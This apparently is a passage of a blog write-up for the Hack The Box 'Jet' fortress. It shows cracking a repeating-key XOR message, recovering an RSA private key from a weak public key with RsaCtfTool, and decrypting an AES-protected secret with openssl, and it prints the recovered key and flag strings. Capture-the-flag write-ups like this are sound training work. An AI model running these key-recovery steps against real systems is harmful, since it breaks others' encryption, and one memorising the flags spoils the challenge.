+<li>exploitme.zip: a zip encrypted with a password</li>
+</ul>
+<p><img alt="xor-cipher.png" src="http://localhost:1337/images/ctf/htb/fortresses/jet/xor-cipher.png"/></p>
+<p>The encrypter consists into a XOR cipher, xor-ing each plaintext's ith char with the ith char of a secret key. If the plaintext is longer than the key, the key is repeated.</p>
+<p>This type of encryption is considered weak, especially when using short keys, and can be easily defeated by brute force attacks.</p>
+<p>This <a href="https://node-security.com/posts/xor-encryption-cracker/">online tool</a> is used to decrypt the encrypted message and recover the secret key.</p>
+<p>The recovered key is the following:</p>
+<blockquote>
+<p>securewebincrocks</p>
+</blockquote>
+<p>and the cleartext message is the following:</p>
+<blockquote>
+<p>Hello mate!<br/>
+<br/>
+First of all an important finding regarding our website: Login is prone to SQL injection! Ask the developers to fix it asap!<br/>
+<br/><br/>
+Regarding your training material, I added the two binaries for the remote exploitation training in exploitme.zip.<br/>
+<strong>The password is the same we use to encrypt our communications.</strong><br/>
+Make sure those binaries are kept safe!<br/>
+<br/> 
+To make your life easier I have already spawned instances of the vulnerable binaries listening on our server.<br/>
+<br/><br/>
+The ports are 5555 and 7777.<br/>
+Have fun and keep it safe!<br/>
+<br/><br/>
+JET{r3p3at1ng_ch4rs_1n_s1mpl3_x0r_g3ts_y0u_0wn3d}  <br/>
+<br/><br/>
+Cheers - Alex<br/>
+...</p>
+</blockquote>
+<p>Since the <em>exploitme.zip</em> password is the same used as secret for the encryption, it's possible to extract its content:</p>
+<ul>
+<li>membermanager: remote binary listening on port  5555</li>
+<li>memo: remote binary listening on port 7777</li>
+</ul>
+<h3 id="weak-rsa-public-key">Weak RSA Public Key</h3>
+<p>User named "tony" as a free accessible home containing the following interesting files and directories:</p>
+<ul>
+<li>.bash_history: user command history</li>
+<li>key.bin.enc: an RSA encrypted key</li>
+<li>keys<ul>
+<li>public.crt: RSA public key generated in pair with the RSA private key used to encrypt the key.bin file</li>
+</ul>
+</li>
+<li>secret.enc: AES encrypted secret using key.bin as symmetric key</li>
+</ul>
+<p>The command history is the following:</p>
+<blockquote>
+<p>openssl rsautl -decrypt -inkey keys/private.key -in key.bin.enc -out key.bin<br/>
+openssl enc -d -aes-256-cbc -in secret.enc -out secret.txt -pass file:./key.bin<br/>
+vi secret.txt<br/>
+rm secret.txt &nbsp;<br/>
+rm key.bin<br/>
+rm keys/private.key &nbsp;<br/>
+exit</p>
+</blockquote>
+<p>Taking a look to the public key in the "public.crt" file, it seems to be a weak key in term of length.</p>
+<p><a href="https://github.com/RsaCtfTool/RsaCtfTool">RsaCtfTool</a> is a tool that performs a series of common cryptographic attacks on RSA weak public keys, attempting to recover the private key from it.</p>
+<blockquote>
+<p>&gt; RsaCtfTool --publickey ./public.crt --private --output ./private.key</p>
+</blockquote>
+<p><img alt="rsa-weak-key-cracking.png" src="http://localhost:1337/images/ctf/htb/fortresses/jet/rsa-weak-key-cracking.png"/></p>
+<p>Note: install <a href="https://pypi.org/project/gmpy2/">gmpy2</a> to drastically increase the performances.</p>
+<p>Using the recovered RSA private key to decrypy the symmetric key, then use it to decrypt the secret:</p>
+<blockquote>
+<p>&gt; openssl rsautl -decrypt -inkey keys/private.key -in key.bin.enc -out key.bin<br/>
+&gt; openssl enc -d -aes-256-cbc -in secret.enc -out secret.txt -pass file:./key.bin  </p>
+</blockquote>
+<p>Flag "More Secrets" obtained: </p>
+<p><img alt="seventh-flag.png" src="http://localhost:1337/images/ctf/htb/fortresses/jet/seventh-flag.png"/></p>
+  </div>
+  <div class="tag-cloud">
+    <p>
+    </p>
+  </div>
+
+
+
+
+
+
+</article>
+
+<footer>
+<p>&copy; Jack69 - 2024 </p>
+<p>
+Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
+  <span class="footer-separator">|</span>
+  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
+  <script id="dark-theme-script"
+          src="http://localhost:1337/theme/dark-theme/dark-theme.min.js"
+          data-enable-auto-detect-theme="True"
+          data-default-theme="dark"
+          type="text/javascript">
+  </script>
+</p></footer>  </main>
+
+<script type="application/ld+json">
+{
+  "@context" : "http://schema.org",
+  "@type" : "Blog",
+  "name": " Jack's Corner ",
+  "url" : "http://localhost:1337",
+  "image": "",
+  "description": "My personal notes on stuff I like, nothing special"
+}
+</script>  <script>
+    window.loadStorkIndex = function () {
+      stork.initialize("http://localhost:1337/theme/stork/stork.wasm")
+      stork.register("sitesearch", "http://localhost:1337/search-index.st", { showProgress: false });
+    }
+  </script>
+  <script src="http://localhost:1337/theme/stork/stork.js"></script>
+
+</body>
+</html>
